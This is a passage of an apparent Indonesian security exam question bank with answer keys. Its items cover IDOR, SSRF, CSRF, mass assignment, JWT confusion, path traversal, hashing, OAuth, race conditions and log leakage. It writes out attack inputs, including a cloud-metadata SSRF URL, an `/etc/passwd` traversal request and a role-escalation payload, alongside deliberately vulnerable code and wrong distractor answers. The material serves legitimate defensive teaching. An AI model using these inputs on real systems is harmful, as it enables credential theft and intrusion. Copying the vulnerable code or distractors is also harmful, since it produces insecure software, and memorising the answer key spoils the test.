      'Mengubah tipe kolom `id` dari integer berurutan menjadi UUID v4 sambil tetap mempertahankan kueri `SELECT * FROM dokumen WHERE id = $1` tanpa pengecekan kepemilikan pengguna.',
      'Menambahkan parameter `userId` yang dikirim dari frontend (`req.query.userId`) lalu mencocokkannya dengan `doc.pemilik_user_id` tanpa mengambil identitas dari token sesi server.',
      'Mengaktifkan rate limiter sebanyak 100 request per menit pada endpoint dokumen agar pelamar membutuhkan waktu lebih lama saat mengunduh dokumen pelamar lain.',
    ],
    akarMasalah:
      'Middleware `requireAuth` hanya memverifikasi bahwa pengguna sudah login (autentikasi), tetapi tidak memverifikasi apakah pengguna tersebut berhak mengakses objek dokumen `:id` tertentu (otorisasi tingkat objek).',
    solusiTerbaik:
      'Enforcement kepemilikan di sisi server berdasarkan identitas terautentikasi (`req.user.id`) memastikan setiap akses objek divalidasi langsung terhadap hak akses pemilik/role.',
    analisisPengecoh:
      'Mengubah `GET` ke `POST` atau menyembunyikan UI tidak mencegah manipulasi request via DevTools/curl; UUID v4 hanya mempersulit tebakan tetapi tetap melanggar otorisasi jika UUID bocor lewat log/referer; mempercayai `req.query.userId` dari klien mudah dipalsukan; rate limiter tidak menutup celah akses tidak sah.',
  },
  {
    level: 'C6',
    topik: 'Keamanan Informasi - Mitigasi SSRF ke Cloud Metadata',
    pertanyaan:
      'Aplikasi e-Surat instansi menyediakan fitur "Pratinjau Tautan Eksternal" dimana backend mengambil judul halaman dari URL yang dikirim pengguna melalui `fetch(req.body.url)`. Tim keamanan melaporkan seorang penyerang memasukkan `http://169.254.169.254/latest/meta-data/iam/security-credentials/` dan berhasil memperoleh kredensial IAM sementara milik server cloud instansi.\n\nRancangan mitigasi arsitektural manakah yang paling komprehensif untuk mencegah eksploitasi Server-Side Request Forgery (SSRF) tersebut?',
    jawabanBenar:
      'Mewajibkan IMDSv2 (memerlukan PUT token dengan hop limit 1) di infrastruktur cloud, menerapkan allowlist skema/domain serta resolving DNS sebelum koneksi untuk memblokir seluruh rentang IP privat/link-local/loopback (127.0.0.0/8, 10.0.0.0/8, 169.254.0.0/16) termasuk saat HTTP redirect, dan mengisolasi layanan fetcher di egress proxy tanpa akses metadata.',
    pengecoh4: [
      'Memeriksa apakah string `req.body.url` mengandung substring `"169.254.169.254"` atau `"localhost"` menggunakan `url.includes()` sebelum memanggil `fetch()`.',
      'Menghapus seluruh hak akses HTTPS keluar pada server backend sambil tetap membiarkan protokol HTTP port 80 terbuka ke seluruh alamat IP internal VPC.',
      'Mengganti fungsi `fetch()` dengan pemanggilan perintah shell `curl ${req.body.url}` karena `curl` secara bawaan menolak akses ke alamat IP link-local cloud.',
      'Memeriksa ekstensi akhir URL agar harus berakhiran `.html` atau `.go.id` tanpa menonaktifkan fitur auto-follow HTTP 302 redirect pada klien HTTP server.',
    ],
    akarMasalah:
      'Server bertindak sebagai proksi tidak terkendali bagi input URL pengguna sehingga penyerang dapat menjangkau endpoint internal dan layanan Instance Metadata Service (IMDSv1) cloud.',
    solusiTerbaik:
      'Kombinasi IMDSv2 di level cloud, validasi pasca-DNS-resolution (termasuk setiap lompatan redirect untuk mencegah DNS rebinding), pemblokiran CIDR privat/link-local, dan egress proxy terisolasi menutup SSRF secara berlapis.',
    analisisPengecoh:
      'Blacklist string mudah dilewati via representasi IP desimal/heksadesimal, IPv6, atau domain redirect; memblokir HTTPS sementara HTTP internal terbuka tidak mencegah SSRF; `curl` via shell justru menambah celah Command Injection dan tidak memblokir 169.254.169.254; pengecekan akhiran URL dapat dilewati lewat HTTP 302 redirect.',
  },
  {
    level: 'C4',
    topik: 'Keamanan Informasi - Cross-Site Request Forgery (CSRF)',
    pertanyaan:
      'Sistem pengelolaan keuangan daerah menggunakan autentikasi berbasis session cookie (`Set-Cookie: sid=...; Path=/; HttpOnly; Secure`) tanpa atribut `SameSite`. Ketika seorang bendahara yang sedang login tidak sengaja membuka situs berita yang disusupi formulir tersembunyi yang melakukan auto-submit `POST https://keuangan.daerah.go.id/api/transfer-dana`, transaksi berhasil tereksekusi atas nama bendahara tersebut.\n\nMengapa serangan tersebut berhasil meski cookie sudah memiliki flag `HttpOnly` dan `Secure`, serta bagaimana pencegahannya?',
    jawabanBenar:
      'Browser secara otomatis melampirkan cookie sesi pada permintaan lintas situs (CSRF) meski JavaScript luar tidak dapat membaca cookie `HttpOnly`; cegah dengan menyetel `SameSite=Lax` atau `SameSite=Strict`, mewajibkan anti-CSRF token (synchronizer token / double-submit cookie) yang divalidasi di server, serta memeriksa header `Origin`/`Referer` pada seluruh aksi pengubah state.',
    pengecoh4: [
      'Serangan terjadi karena sertifikat SSL server sudah kedaluwarsa; cukup memperbarui sertifikat TLS menjadi EV SSL agar browser berhenti mengirim cookie pada permintaan formulir lintas situs.',
      'Mengubah endpoint transfer dana agar menggunakan metode `GET` dengan parameter query string karena peramban hanya mengeksekusi serangan CSRF pada permintaan `POST`.',
      'Menambahkan header `Access-Control-Allow-Origin: https://keuangan.daerah.go.id` tanpa mengubah konfigurasi cookie atau token, karena CORS otomatis memblokir pengiriman form HTML standar `application/x-www-form-urlencoded`.',
      'Menghapus flag `HttpOnly` agar skrip frontend dapat menghapus cookie secara berkala setiap 5 detik melalui `document.cookie` sebelum halaman eksternal terbuka.',
    ],
    akarMasalah:
      '`HttpOnly` mencegah pencurian cookie lewat XSS, tetapi tidak mencegah browser mengirimkan cookie secara otomatis pada cross-site form submission (CSRF).',
    solusiTerbaik:
      'Atribut `SameSite=Strict/Lax` membatasi pengiriman cookie lintas situs, sedangkan synchronizer CSRF token yang tak bisa ditebak situs lain memastikan aksi sensitif benar-benar berasal dari UI aplikasi resmi.',
    analisisPengecoh:
      'Jenis sertifikat TLS tidak mengubah perilaku pengiriman cookie browser; endpoint `GET` pengubah state justru lebih mudah dieksploitasi CSRF via tag `<img>`; HTML form `application/x-www-form-urlencoded` merupakan simple request yang tetap terkirim ke server tanpa CORS preflight; menghapus `HttpOnly` justru membuka kerentanan pencurian sesi via XSS.',
  },
  {
    level: 'C4',
    topik: 'Keamanan Informasi - Mass Assignment / Privilege Escalation',
    pertanyaan:
      'Pada endpoint pembaruan profil pegawai `PATCH /api/profil`, pengembang menulis kode singkat berikut menggunakan ORM:\n\n```ts\napp.patch("/api/profil", requireAuth, async (req, res) => {\n  const user = await User.findByPk(req.user.id);\n  await user.update(req.body);\n  res.json({ status: "ok" });\n});\n```\n\nSeorang pengguna biasa mengirim payload `{ "nama": "Budi", "role": "SUPER_ADMIN", "is_verified": true }` melalui DevTools dan langsung mendapatkan hak akses penuh sistem. Apa akar kerentanan ini dan perbaikan paling tepat?',
    jawabanBenar:
      'Terjadi Mass Assignment karena seluruh properti `req.body` diteruskan langsung ke model ORM; lakukan validasi skema ketat dan explicit field allowlisting (hanya mengekstrak field yang boleh diubah pengguna seperti `{ nama, noHp, alamat }`) sebelum memanggil `user.update()`.',
    pengecoh4: [
      'Menghapus field input `role` dari komponen form React di sisi klien agar pengguna biasa tidak melihat pilihan perubahan peran pada layar browser.',
      'Menambahkan kondisi `if (req.body.role === "SUPER_ADMIN") delete req.body.role;` sehingga seluruh field lain di `req.body` tetap dapat diteruskan langsung ke ORM secara aman.',
      'Mengganti metode HTTP dari `PATCH` menjadi `PUT` agar ORM menolak secara otomatis properti tambahan yang tidak ditampilkan pada tampilan formulir frontend.',
      'Membuat kolom `role` menjadi tipe `VARCHAR(50)` alih-alih `ENUM` di basis data sehingga nilai yang dikirim pengguna tidak memicu pembaruan indeks tabel.',
    ],
    akarMasalah:
      'Binding otomatis `req.body` langsung ke entitas database memungkinkan penyerang memodifikasi atribut internal sensitif (`role`, `is_verified`, `saldo`, `unit_id`) yang tidak seharusnya diubah pengguna.',
    solusiTerbaik:
      'DTO eksplisit / schema validator (seperti Zod/Joi) dengan strip unknown fields dan allowlist properti di sisi server memastikan hanya kolom profil yang diizinkan yang dapat dimutasi.',
    analisisPengecoh:
      'Menyembunyikan input di frontend tidak mencegah manipulasi JSON via curl/DevTools; blocklist tunggal gagal melindungi kolom sensitif lain (`is_verified`, `role: "ADMIN"`); metode `PUT` tidak menghentikan mass assignment; mengubah tipe kolom ke `VARCHAR` sama sekali tidak memblokir eskalasi hak akses.',
  },
  {
    level: 'C5',
    topik: 'Keamanan Informasi - Kerentanan Validasi JWT (Algorithm Confusion)',
    pertanyaan:
      'Audit kode autentikasi SSO instansi menemukan pustaka validasi JWT yang dikonfigurasi sebagai berikut:\n\n```ts\nconst decoded = jwt.verify(token, PUBLIC_KEY_PEM);\n// tanpa opsi algorithms, menerima header { "alg": "HS256" } atau { "alg": "none" }\n```\n\nPenyerang yang mengunduh berkas `PUBLIC_KEY_PEM` dari endpoint publik JWKS berhasil memalsukan token dengan payload `{ "sub": "admin", "role": "ADMIN" }` yang lolos verifikasi server. Mengapa eksploitasi ini berhasil dan bagaimana perbaikannya?',
    jawabanBenar:
      'Terjadi JWT algorithm confusion karena verifier memercayai field `alg` dari header token yang tidak terpercaya sehingga penyerang menandatangani token menggunakan `HS256` dengan kunci publik RSA sebagai HMAC secret; wajib kunci secara eksplisit opsi `algorithms: ["RS256"]` (atau `["EdDSA"]`), tolak `alg: none`, dan validasi klaim `iss`, `aud`, serta `exp`.',
    pengecoh4: [
      'Menyembunyikan endpoint JWKS dari internet publik dan mengirim `PUBLIC_KEY_PEM` melalui email terenkripsi ke setiap browser pengguna agar penyerang tidak dapat membaca isi kunci publik.',
      'Menggunakan `jwt.decode(token)` sebagai pengganti `jwt.verify()` karena `decode()` tidak bergantung pada header `alg` sehingga kebal terhadap kebingungan algoritma kriptografi.',
      'Mengenkripsi payload JSON di dalam token menggunakan Base64 dua kali agar penyerang tidak dapat mengubah klaim `role` menjadi `"ADMIN"` sebelum dikirim ke server.',
      'Memperpanjang masa berlaku token (`exp`) menjadi 365 hari dan menyimpan `PUBLIC_KEY_PEM` pada variabel lingkungan `VITE_PUBLIC_KEY` agar tidak perlu mengambil dari JWKS.',
    ],
    akarMasalah:
      'Verifier tidak membatasi daftar algoritma yang diizinkan secara eksplisit di sisi server, memungkinkan penyerang mengganti algoritma asimetris (`RS256`) menjadi simetris (`HS256`) memakai kunci publik yang memang bersifat terbuka.',
    solusiTerbaik:
      'Menetapkan `algorithms: ["RS256"]` (strict allowlist) di server mencegah downgrade/confusion algoritma, dilengkapi validasi `iss`, `aud`, `exp`, dan rotasi `kid` yang valid.',
    analisisPengecoh:
      'Kunci publik dirancang untuk bisa dibagikan dan tidak bisa disembunyikan dari klien; `jwt.decode()` sama sekali tidak memverifikasi tanda tangan kriptografi; Base64 bukan enkripsi dan mudah diubah; memperpanjang `exp` justru memperbesar dampak kebocoran token.',
  },
  {
    level: 'C4',
    topik: 'Keamanan Informasi - Path Traversal pada Unduhan Lampiran',
    pertanyaan:
      'Layanan arsip digital menyediakan endpoint untuk mengunduh berkas lampiran PDF yang tersimpan di direktori `/var/app/uploads`. Saat dilakukan uji keamanan, permintaan `GET /api/download?file=../../../../etc/passwd` ternyata berhasil mengembalikan isi berkas sistem Linux tersebut.\n\n```ts\nconst filePath = path.join("/var/app/uploads", String(req.query.file));\nres.sendFile(filePath);\n```\n\nManakah strategi remediasi paling aman untuk menutup celah Path Traversal tersebut secara menyeluruh?',
    jawabanBenar:
      'Hindari menerima path mentah dari pengguna (gunakan ID dokumen acak yang dipetakan ke lokasi berkas di basis data), atau jika nama berkas wajib dipakai, lakukan `path.basename()` + `path.resolve()` lalu verifikasi ketat bahwa jalur kanonis hasil resolusi diawali dengan direktori dasar `/var/app/uploads/` (dengan pemisah direktori) serta cek `fs.realpath` terhadap symlink.',
    pengecoh4: [
      'Menghapus string `"../"` satu kali menggunakan `file.replace("../", "")` sehingga input berbahaya otomatis berubah menjadi nama berkas yang aman di dalam folder uploads.',
      'Memeriksa apakah parameter `req.query.file` diakhiri dengan `.pdf` tanpa menormalisasi jalur karena semua berkas sensitif sistem operasi tidak pernah memiliki ekstensi `.pdf`.',
      'Mengubah `path.join` menjadi penggabungan string `"/var/app/uploads/" + req.query.file` karena metode `path.join` yang memproses segmen direktori induk.',
      'Menjalankan proses Node.js menggunakan akun `root` namun mengubah hak akses berkas `/etc/passwd` menjadi `chmod 000` agar tidak bisa dibaca oleh endpoint aplikasi.',
    ],
    akarMasalah:
      '`path.join` menormalisasi urutan `../` keluar dari direktori root yang dimaksud tanpa memeriksa batas direktori aman (directory containment), memungkinkan pembacaan berkas arbitrer di OS.',
    solusiTerbaik:
      'Indirection lewat ID basis data (bukan nama berkas dari klien) adalah standar emas; jika tetap memakai nama berkas, kanonisasi `path.resolve`/`realpath` + pengecekan prefix direktori dasar dengan trailing separator menutup celah traversal dan symlink escape.',
    analisisPengecoh:
      '`replace("../", "")` satu kali mudah dilewati dengan pola bersarang `....//`; cek ekstensi `.pdf` dapat dilewati dengan berkas `.pdf` di folder rahasia lain atau null-byte pada runtime tertentu; penggabungan string tetap diinterpretasikan OS sebagai traversal `../`; menjalankan aplikasi sebagai `root` melanggar least privilege dan `chmod 000 /etc/passwd` merusak sistem operasi.',
  },
  {
    level: 'C5',
    topik: 'Keamanan Informasi - Hashing Kata Sandi (Argon2id vs SHA-256)',
    pertanyaan:
      'Tim keamanan meninjau skema penyimpanan kata sandi pada aplikasi portal ASN yang baru dibangun oleh vendor. Kode pendaftaran akun saat ini menyimpan kata sandi menggunakan `crypto.createHash("sha256").update(password).digest("hex")` tanpa salt. Vendor berargumen bahwa SHA-256 sudah merupakan standar kriptografi aman karena tidak memiliki kolisi praktis seperti MD5.\n\nEvaluasi argumen vendor tersebut dan tentukan standar penyimpanan kata sandi yang paling tepat.',
    jawabanBenar:
      'Argumen vendor keliru karena SHA-256 dirancang super cepat untuk integritas data, bukan untuk kata sandi, sehingga tanpa salt rentan terhadap rainbow table dan cracking miliaran hash per detik menggunakan GPU; gunakan Password Hashing KDF yang lambat dan memory-hard seperti Argon2id (atau scrypt/bcrypt) dengan salt kriptografis acak unik per pengguna.',
    pengecoh4: [
      'Argumen vendor sudah tepat selama nilai hash SHA-256 tersebut dienkripsi ulang dengan Base64 sebelum disimpan ke kolom database agar tidak dapat dibaca langsung oleh administrator.',
      'Cukup menambahkan satu string salt statis global (`GLOBAL_SALT = "ASN_2025"`) yang sama untuk seluruh pengguna lalu tetap memakai satu putaran SHA-256 agar proses login tetap instan di bawah 1 milidetik.',
      'Mengganti mekanisme hashing menjadi enkripsi dua arah AES-256-GCM menggunakan kunci statis di file `.env` agar tim helpdesk dapat mendekripsi dan mengingatkan kata sandi pegawai yang lupa.',
      'Menggunakan fungsi `SHA-512` tiga kali berturut-turut tanpa salt karena panjang output 512 bit secara matematis mencegah serangan brute-force menggunakan perangkat keras GPU.',
    ],
    akarMasalah:
      'Hash kriptografi umum (SHA-256/SHA-512) sangat cepat dieksekusi di GPU/ASIC dan ketiadaan salt unik per-pengguna membuat dua akun dengan kata sandi identik menghasilkan digest identik serta rentan terhadap tabel prekomputasi.',
    solusiTerbaik:
      'Argon2id (rekomendasi OWASP) menggabungkan salt acak unik per-akun dengan biaya komputasi serta memori tinggi (memory-hard), memperlambat brute-force GPU/ASIC secara drastis.',
    analisisPengecoh:
      'Base64 bukan keamanan; salt statis global tetap membuka deteksi kata sandi identik lintas akun dan tidak menghambat GPU brute-force pada SHA-256; enkripsi dua arah memungkinkan pencurian massal kata sandi plaintext bila kunci bocor dan melanggar prinsip tidak dapat dibalik; 3 putaran SHA-512 tetap terlalu cepat pada GPU modern.',
  },
  {
    level: 'C6',
    topik: 'Keamanan Informasi - OAuth 2.0 + PKCE untuk Aplikasi SPA/Mobile',
    pertanyaan:
      'Instansi membangun aplikasi mobile publik (Android/iOS) dan Single Page Application (SPA) yang terintegrasi dengan SSO OAuth 2.0 milik pemerintah. Karena klien berjalan di perangkat warga (public client), menyimpan `client_secret` di dalam kode aplikasi berisiko diekstrak melalui reverse engineering.\n\nAlur OAuth 2.0 manakah yang paling aman dan direkomendasikan standar IETF/OWASP saat ini untuk arsitektur klien tersebut?',
    jawabanBenar:
      'Menggunakan Authorization Code Flow dengan PKCE (`code_verifier` acak di klien dan `code_challenge` S256 dikirim pada tahap otorisasi) tanpa menyimpan `client_secret` di perangkat, atau pola Backend-for-Frontend (BFF) untuk SPA agar token dikelola aman di server.',
    pengecoh4: [
      'Menggunakan Implicit Grant Flow (`response_type=token`) agar `access_token` langsung dikembalikan melalui URL fragment `#access_token=...` tanpa memerlukan pertukaran kode di endpoint token.',
      'Menggunakan Resource Owner Password Credentials (ROPC) Grant dengan meminta aplikasi mobile menampung username dan password SSO secara langsung lalu menyimpannya di SharedPreferences.',
      'Menyematkan `client_secret` ke dalam berkas APK setelah di-obfuscate dengan ProGuard dan dienkripsi XOR, karena kode hasil kompilasi tidak mungkin dibongkar oleh pengguna akhir.',
      'Menggunakan Client Credentials Flow dari aplikasi mobile publik agar seluruh warga yang memakai aplikasi berbagi satu access token yang sama tanpa perlu login individual.',
    ],
    akarMasalah:
      'Public client (SPA/mobile) tidak mampu menjaga kerahasiaan `client_secret`, sementara authorization code yang dikembalikan ke redirect URI berisiko dicegat aplikasi berbahaya jika tidak terikat ke klien pemohon.',
    solusiTerbaik:
      'Authorization Code + PKCE (SHA-256) mengikat authorization code secara kriptografis ke `code_verifier` unik per sesi login, menggantikan peran `client_secret` pada public client; pola BFF semakin mengamankan SPA dengan cookie `HttpOnly`.',
    analisisPengecoh:
      'Implicit Flow sudah berstatus deprecated (OAuth 2.1) karena mengekspos token di browser history/Referer; ROPC melanggar prinsip delegasi SSO dan membuka pencurian kredensial langsung; obfuscation `client_secret` di APK selalu dapat di-reverse engineer; Client Credentials hanya untuk komunikasi machine-to-machine tanpa konteks pengguna.',
  },
  {
    level: 'C4',
    topik: 'Keamanan Informasi - Broken Function Level Authorization (BFLA)',
    pertanyaan:
      'Aplikasi manajemen aset instansi menyembunyikan menu "Hapus Aset Permanen" bagi pengguna berrole `STAFF_UNIT` di tampilan web. Namun saat audit keamanan, seorang staf biasa menyalin pola URL dari dokumen lama lalu mengirim `DELETE /api/admin/aset/512` menggunakan token JWT miliknya sendiri, dan data aset tersebut benar-benar terhapus.\n\n```ts\napp.delete("/api/admin/aset/:id", authenticateJwt, async (req, res) => {\n  await db.query("DELETE FROM aset WHERE id = $1", [req.params.id]);\n  res.json({ deleted: true });\n});\n```\n\nJenis kerentanan OWASP API apa yang tereksploitasi dan bagaimana perbaikan struktural terbaiknya?',
    jawabanBenar:
      'Terjadi Broken Function Level Authorization (BFLA) karena otorisasi peran hanya dilakukan di lapisan tampilan (UI) tanpa penegakan di endpoint backend; terapkan middleware otorisasi berbasis peran/izin (RBAC/ABAC) secara default-deny di server seperti `requireRole(["ADMIN_ASET"])` pada seluruh rute administratif serta catat audit log.',
    pengecoh4: [
      'Menambahkan komponen pengecekan `if (user.role !== "ADMIN_ASET") return null;` di lebih banyak file React frontend dan meng-minify bundle JavaScript agar URL endpoint admin tidak mudah terbaca.',
      'Mengganti prefix URL `/api/admin/aset/:id` menjadi `/api/internal/x92-aset/:id` tanpa mengubah middleware server karena penyerang tidak akan mampu menebak nama rute baru.',
      'Memeriksa header `Referer: https://aset.go.id/admin/dashboard` pada endpoint `DELETE` untuk memastikan permintaan benar-benar diklik dari halaman menu admin.',
      'Menonaktifkan verifikasi `authenticateJwt` pada endpoint `DELETE` dan menggantinya dengan pengecekan `req.body.isAdmin === true` agar lebih eksplisit.',
    ],
    akarMasalah:
      'Otorisasi tingkat fungsi/endpoint administratif tidak ditegakkan di sisi server (server-side RBAC/ABAC missing), melainkan hanya mengandalkan penyembunyian elemen antarmuka klien.',
    solusiTerbaik:
      'Middleware otorisasi deklaratif berbasis prinsip deny-by-default di sisi server (divalidasi dari klaim/DB sesi terverifikasi) plus audit trail mencegah eksekusi fungsi administratif oleh akun berhak rendah.',
    analisisPengecoh:
      'Validasi UI dan minifikasi JS tidak membatasi panggilan API langsung; security by obscurity pada nama rute mudah bocor di trafik jaringan; header `Referer` dapat dipalsukan dengan mudah; mempercayai flag `req.body.isAdmin` dari klien memberi akses penuh ke siapa saja.',
  },
  {
    level: 'C4',
    topik: 'Keamanan Informasi - Race Condition (TOCTOU) pada Kuota Bantuan',
    pertanyaan:
      'Portal klaim voucher pelatihan prakerja daerah membatasi setiap NIK hanya boleh mengklaim 1 kuota subsidi. Namun setelah rilis, tim audit menemukan beberapa NIK berhasil menerima 5 voucher sekaligus dalam selisih 12 milidetik. Potongan kode klaim:\n\n```ts\nconst claimed = await db.query("SELECT COUNT(*) FROM klaim WHERE nik = $1", [nik]);\nif (Number(claimed.rows[0].count) === 0) {\n  await generateVoucherExternal(nik);\n  await db.query("INSERT INTO klaim (nik, kode) VALUES ($1, $2)", [nik, kode]);\n}\n```\n\nMengapa pembatasan tersebut berhasil ditembus dan bagaimana perbaikan paling andal?',
    jawabanBenar:
      'Terjadi celah race condition Time-of-Check to Time-of-Use (TOCTOU) saat penyerang mengirim beberapa request paralel sebelum transaksi pertama melakukan `INSERT`; terapkan constraint `UNIQUE (nik)` di basis data dan gunakan `INSERT ... ON CONFLICT DO NOTHING RETURNING id` di awal (atau transaksi terkunci) sebelum memanggil layanan penerbitan voucher eksternal.',
    pengecoh4: [
      'Menonaktifkan tombol "Klaim Voucher" di browser dengan `disabled={true}` setelah klik pertama agar pengguna tidak mungkin mengirimkan lebih dari satu permintaan HTTP ke server.',
      'Memindahkan pengecekan `SELECT COUNT(*)` ke setelah fungsi `generateVoucherExternal(nik)` selesai dieksekusi supaya status kuota selalu dicek menggunakan data terbaru.',
      'Menambahkan `await sleep(500)` sebelum menjalankan `INSERT` sehingga permintaan paralel memiliki waktu untuk menyelesaikan pembacaan `SELECT COUNT(*)` secara bergantian.',
      'Menyimpan variabel `const sedangProses = new Set()` di memori global satu proses Node.js tanpa constraint basis data meski aplikasi berjalan pada 4 container di belakang load balancer.',
    ],
    akarMasalah:
      'Jeda waktu antara pemeriksaan (`SELECT COUNT`) dan penulisan (`INSERT`), ditambah panggilan HTTP eksternal di antaranya, memungkinkan beberapa permintaan paralel sama-sama melihat `count === 0`.',
    solusiTerbaik:
      'Menjadikan `UNIQUE (nik)` di basis data sebagai gerbang atomik (`INSERT ... ON CONFLICT DO NOTHING`) sebelum memicu side effect eksternal menjamin eksklusi mutlak lintas seluruh pod backend.',
    analisisPengecoh:
      'Disable tombol di UI mudah dilewati memakai script paralel/Burp Intruder; memindahkan pengecekan ke belakang justru tetap memicu penerbitan voucher ganda; `sleep(500)` memperlebar jendela race condition; `Set` in-memory tidak tersinkronisasi antar 4 container.',
  },
  {
    level: 'C5',
    topik: 'Keamanan Informasi - Pertahanan Credential Stuffing & MFA',
    pertanyaan:
      'Log autentikasi portal layanan kepegawaian menunjukkan 85.000 percobaan login gagal dalam 10 menit dari 4.000 alamat IP berbeda menggunakan daftar email ASN yang pernah bocor di layanan pihak ketiga. Tim diminta merancang mitigasi yang tidak mengganggu pegawai sah yang sedang mengakses sistem dari jaringan NAT kantor.\n\nStrategi mitigasi manakah yang paling efektif menghadapi serangan credential stuffing terdistribusi tersebut?',
    jawabanBenar:
      'Menerapkan rate limiting adaptif per-akun sekaligus per-IP/ASN-network dengan progressive delay/challenge (CAPTCHA/WebAuthn), mewajibkan Multi-Factor Authentication (MFA berbasis TOTP/FIDO2), memvalidasi kata sandi terhadap daftar kebocoran (breached password check), dan mengembalikan pesan error login generik tanpa membocorkan eksistensi akun.',
    pengecoh4: [
      'Memblokir permanen seluruh subnet alamat IP kantor instansi begitu terjadi 5 kali salah kata sandi dalam 1 menit agar tidak ada lagi percobaan login dari jaringan tersebut.',
      'Mengunci permanen (permanent account lockout) setiap akun ASN setelah 3 kali gagal login tanpa batas waktu dan mengharuskan pegawai datang langsung ke kantor pusat untuk membuka blokir.',
      'Menampilkan pesan spesifik "Email ditemukan, namun kata sandi salah" pada halaman login agar pegawai mengetahui akunnya sudah terdaftar dan tidak salah mengetik email.',
      'Mengganti metode login dari form JSON menjadi HTTP Basic Authentication karena protokol Basic Auth dienkripsi kuat dan tidak dapat diotomatisasi oleh skrip penyerang.',
    ],
    akarMasalah:
      'Serangan credential stuffing terdistribusi memakai ribuan IP berbeda dan daftar kredensial bocor sehingga pemblokiran berbasis IP tunggal gagal, sementara lockout permanen membuka celah Denial-of-Service terhadap akun pegawai sah.',
    solusiTerbaik:
      'Kombinasi MFA (menetralkan kredensial bocor meski benar), rate limit adaptif/challenge per-akun, deteksi password bocor, dan pesan error generik melindungi akun tanpa melumpuhkan jaringan NAT kantor.',
    analisisPengecoh:
      'Memblokir subnet NAT kantor melumpuhkan ratusan pegawai sah; lockout permanen memudahkan penyerang melumpuhkan seluruh akun ASN (account lockout DoS); pesan error spesifik memfasilitasi account enumeration; HTTP Basic Auth hanya memakai Base64 dan sangat mudah diotomatisasi.',
  },
  {
    level: 'C5',
    topik: 'Keamanan Informasi - Keamanan Rantai Pasok Perangkat Lunak (Supply Chain/SCA)',
    pertanyaan:
      'Sebelum peluncuran sistem layanan publik berbasis Node.js yang memakai 140 dependensi pihak ketiga, tim keamanan siber mendeteksi satu pustaka pemrosesan PDF pihak ketiga baru saja terkena CVE kritis (Remote Code Execution) dan terdapat risiko injeksi paket palsu (*typosquatting* / *dependency confusion*) pada pipeline CI.\n\nKebijakan dan kontrol teknis DevSecOps manakah yang paling tepat diterapkan dalam pipeline CI/CD?',
    jawabanBenar:
      'Mengintegrasikan Software Composition Analysis (SCA) otomatis dan pembuatan SBOM di CI yang memblokir build jika ditemukan CVE kritis tanpa patch, mengunci integritas paket lewat lockfile hash + private registry scoped namespace untuk paket internal, serta menonaktifkan skrip instalasi berbahaya (`--ignore-scripts`) bila tidak diperlukan.',
    pengecoh4: [
      'Menonaktifkan seluruh pemeriksaan kerentanan dependensi di CI selama CVE tersebut hanya berada pada transitive dependency (dependensi turunan) karena dependensi turunan tidak pernah dieksekusi aplikasi.',
      'Menyalin kode sumber seluruh 140 pustaka pihak ketiga ke satu file tunggal secara manual agar tidak tercatat di `package.json` sehingga pemindai keamanan menampilkan nol temuan kerentanan.',
      'Mengonfigurasi pipeline CI agar selalu menarik versi paket terbaru dari registry publik menggunakan tanda bintang (`*`) setiap kali server produksi melakukan restart.',
      'Mengandalkan Web Application Firewall (WAF) di depan server semata untuk seluruh kerentanan pustaka backend dan membekukan versi seluruh dependensi selama lima tahun ke depan.',
    ],
    akarMasalah:
      'Ketergantungan pada ratusan pustaka terbuka tanpa kontrol integritas, pemindaian kerentanan otomatis, dan pemisahan namespace internal membuka risiko eksploitasi RCE maupun supply chain attack.',
    solusiTerbaik:
      'SCA + SBOM memberi visibilitas penuh hingga dependensi transitif, lockfile integrity + scoped private registry mencegah dependency confusion, dan pembatasan lifecycle script menekan risiko eksekusi kode berbahaya saat install.',
    analisisPengecoh:
      'Dependensi transitif tetap dieksekusi di runtime dan sering menjadi sumber CVE kritis (seperti Log4Shell); menyembunyikan kode di satu berkas tidak menghilangkan kerentanan melainkan menipu pemindai; wildcard `*` membuka serangan supply chain otomatis; WAF tidak selalu bisa menutup RCE di pemrosesan dokumen internal.',
  },
  {
    level: 'C4',
    topik: 'Keamanan Informasi - Kebocoran Informasi pada Log & Error Response',
    pertanyaan:
      'Saat terjadi kesalahan koneksi basis data pada aplikasi pajak daerah, respons API yang dikirim ke browser wajib pajak serta log terpusat di ELK Stack menampilkan keluaran berikut:\n\n```json\n{\n  "error": "password authentication failed for user \'pajak_admin\'",\n  "connectionString": "postgres://pajak_admin:S3cr3tPajak!@10.20.4.12:5432/db_pajak",\n  "stack": "Error at /srv/app/src/db.ts:44:12",\n  "requestBody": { "npwp": "09.254.294.3-407.000", "token": "Bearer eyJhbGci..." }\n}\n```\n\nRisiko keamanan apa yang ditimbulkan keluaran tersebut dan rancangan penanganan error serta logging manakah yang paling tepat?',
    jawabanBenar:
      'Respons error membocorkan kredensial database, topologi IP internal, dan stack trace ke publik, sementara log menyimpan secret/PII mentah; kembalikan pesan error generik berisi `correlation_id` ke klien, simpan detail teknis hanya di log internal yang telah disanitasi/redacted untuk field sensitif (password, token, connection string, PII), dan batasi akses log berbasis RBAC.',
    pengecoh4: [
      'Menghapus seluruh mekanisme logging pada server produksi dan mengembalikan string kosong dengan status HTTP 200 OK setiap kali terjadi exception agar tidak ada informasi apa pun yang tercatat.',
      'Mempertahankan respons JSON tersebut agar tim dukungan teknis mudah mendiagnosis masalah dari tangkapan layar wajib pajak, namun mengonversi teks error menjadi huruf kecil seluruhnya.',
      'Tetap menyimpan `connectionString` dan `Bearer token` di log ELK Stack dengan alasan seluruh pegawai IT di instansi dapat dipercaya dan log hanya disimpan selama satu tahun.',
      'Mengganti kode status HTTP dari 500 menjadi 404 Not Found sambil tetap menyertakan `stack` dan `connectionString` di body respons supaya pemindai otomatis mengira endpoint tidak ada.',
    ],
    akarMasalah:
      'Verbose error message mengekspos informasi sensitif (CWE-209) ke penyerang eksternal, sementara logging tanpa redaction melanggar keamanan kredensial dan privasi data wajib pajak (CWE-532).',
    solusiTerbaik:
      'Pemisahan pesan error publik generik + `correlation_id` dengan log internal terstruktur yang menerapkan secret/PII redaction dan kontrol akses ketat menjaga debuggability sekaligus keamanan.',
    analisisPengecoh:
      'Menghapus semua logging dan mengembalikan 200 OK melumpuhkan observabilitas dan deteksi insiden; membiarkan kredensial tampil di klien membuka kompromi langsung; menyimpan secret di log melanggar prinsip least privilege karena log sering diakses lebih luas daripada DB produksi; mengubah status ke 404 tidak menyembunyikan payload sensitif di body.',
  },
];
